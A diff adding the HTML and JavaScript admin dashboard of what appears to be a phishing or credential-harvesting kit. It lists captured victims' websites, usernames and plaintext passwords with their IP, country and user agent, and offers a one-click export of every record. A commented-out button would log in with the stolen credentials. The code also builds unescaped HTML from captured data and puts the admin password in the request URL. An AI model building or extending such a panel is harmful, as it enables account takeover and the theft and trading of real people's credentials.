@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>timstech</title>
+        <link rel="stylesheet" href="main.css">
+    </head>
+    <body>
+
+        <div class="loading">
+                <div class="text">please wait till load</div>
+        </div>
+       
+       <div class="banner">
+           <div class="datatime">Thu Aug 01 2019 17:29:37 GMT+0530 (India Standard Time)</div>
+       </div>
+       <div class="dashboard">
+           <div class="wish">Hello There!</div>
+
+           <div class="row">
+               <a href="/users.html">
+                 <div class="user_man">User Management</div>
+                </a>
+               <div class="logout">Logout</div>
+           </div>
+       </div>
+       <div class="title">
+           Users Information
+       </div>
+      <div class="search">
+          <div class="searchbar">
+              <span>search by website:</span> 
+              <input type="text" class="searchinput">
+              <button class="search-btn">search</button>
+              <button class="backup-btn">Backup</button>
+          </div>
+      </div>
+      <div class="data-table">
+            <div class="row header">
+                    <div class="col id">ID</div>
+                    <div class="col datetime">DateTime</div>
+                    <div class="col details">Details(website,UserName,Password)</div>
+                    <div class="col ipc">IP,Country,UserAgent</div>
+                    <div class="col actions">Actions</div>
+                </div>
+          <div class="table">
+              
+          </div>
+      </div>
+        <template class="row-template">
+            <div class="row">
+                <div class="col id">1</div>
+                <div class="col datetime">monday 23 jabhy,egg</div>
+                <div class="col details">
+                    <p class="details-in">
+
+                    </p>
+                </div>
+                <div class="col ipc"><p class="ipc-in"></p></div>
+                <div class="col actions">
+                    <button class="delete">
+                            delete record
+                    </button>
+                    <!-- <button class="login">
+                            login
+                    </button> -->
+                </div>
+            </div>
+        </template>
+       
+        <script>
+        window.onload=function(){
+             let id=localStorage.getItem('id');
+             let password=localStorage.getItem('password');
+             let container=document.querySelector('.table');
+             let template=document.querySelector('.row-template');
+             let node=document.importNode(template.content,true);
+             let sessions;
+             let url=`/getxlog/${id}/${password}`;
+             let deleteurl=`/delete/session`;
+              document.querySelector('.logout').addEventListener('click',e=>{
+                    localStorage.clear();
+                    window.location.href="/";
+              });
+
+             fetch(url).then(res=>res.json()).then(({data,status})=>{
+                  document.querySelector('.loading').style.display="none";
+                if(status && data){
+                    sessions=data;
+                   
+                    if(sessions.length>0){
+                        fireUpTable(sessions);
+
+                    document.querySelector(".searchinput").addEventListener('input',function(){
+                           let txt=this.value;
+
+                           let tempSessions=[];
+                           sessions.map(session=>{
+                               console.log("fishyyy...",session);
+                               let {host} =session;
+                               if(new RegExp(txt).test(host)){
+                            
+                                   tempSessions.push(session);
+                               }
+                           });
+                           fireUpTable(tempSessions);
+                        
+
+                    });
+                    document.querySelector(".backup-btn").addEventListener('click',e=>{
+                        let text=JSON.stringify(sessions);
+                     //   console.log(text);
+                        let link=document.createElement('a');
+                        link.download=`backup_${Date.now()}.txt`;
+                        let blob=new Blob([text],{type:"text/plain"});
+                        link.href=URL.createObjectURL(blob);
+                        link.click();
+                    })
+                    }else{
+                        //  document.querySelector('.loading').innerHTML="there is no data";
+                    }
+                    
+                  
+                }else if(data==null){
+                // document.querySelector('.loading').innerHTML="there is no data";
+                }else{
+                 document.querySelector('.loading').innerHTML="Access Denied";
+                }
+             }).catch(err=>console.log(err));  
+
+          function fireUpTable(sessions){
+            container.innerHTML='';
+            sessions.reverse().forEach((session,i)=>{
+                console.log(session);
+                console.log(session)
+                    let _node=node.cloneNode(true);
+                    let _id=session._id;
+                    let {country,dateTime,host,ip,userAgent}=session;
+                    let hostURL = session.url;
+                    let fields=session.session;
+                    console.log("debug",session.session);
+                    let {email,password} =fields;
+                    //working fine upro here      
+                    let dt=new Date(dateTime).toDateString();    
+                    let mnode=node.cloneNode(true);
+                    mnode.querySelector(".id").innerHTML=i;
+                    mnode.querySelector(".datetime").innerHTML=dt;
+                    mnode.querySelector(".details-in").innerHTML=`
+                                      <p> <spnan class="host">${host}</span>,<span class="email">${email}</span>,<span class="password">${password}</span></p>`;
+                    mnode.querySelector(".ipc").innerHTML=`
+                              <p> <span class="ip"> ${ip}</span>, <span class="country"> ${country}</span>, <span class="userAgent">${userAgent}</span></p>`;
+                                  
+                    mnode.querySelector(".delete").dataset.id=_id;
+                    // mnode.querySelector(".login").dataset.data = JSON.stringify({ email, password, hostURL });
+                    container.appendChild(mnode);
+                    addListeners();
+                  });
+
+          }
+           function addListeners(){
+                document.querySelectorAll('.row').forEach(row=>{
+                        let btn=row.querySelector(".delete");;
+                        btn&& btn.addEventListener('click',function(e){
+                        let index=this.dataset.id;
+                        fetch(`${deleteurl}`,{
+                          method:"POST",
+                          headers:{
+                             "content-Type":"application/json",
+                          },
+                          body:JSON.stringify({
+                              username:id,
+                              password,
+                              id:index
+                          })
+                        }).then(res=>res.json()).then(({status})=>{
+                            if(status==true){
+                                row.remove();
+                                sessions.splice(0,1);
+                            }
+                        })
+                     })
+                    
+                   });      
+           }
+        
+        }
+
+
+        </script>
+        
+    </body>
+</html>
